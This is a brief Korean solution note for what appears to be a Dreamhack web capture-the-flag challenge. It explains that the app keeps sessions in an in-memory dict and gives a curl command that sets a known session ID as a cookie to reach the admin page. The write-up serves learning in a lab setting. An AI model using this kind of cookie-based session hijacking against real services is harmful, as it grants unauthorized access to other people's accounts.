# 풀이 복기

session_storage가 flask session이 아닌 메모리 dict이고, /admin에 그대로 접근 가능합니다.

세션 아이디가 "39f3210b35d8043554ec005282e6b0cb34f6bbf428f22bd04ca62e177feeaad7"인걸 알았으니, 쿠키에 대입해서 풀면 됩니다. 터미널에서 다음과 같은 명령어를 치면 되겠네요.

````
curl http://host3.dreamhack.games:22751/ -H  "Cookie: sessionid=39f3210b35d8043554ec005282e6b0cb34f6bbf428f22bd04ca62e177feeaad7"
```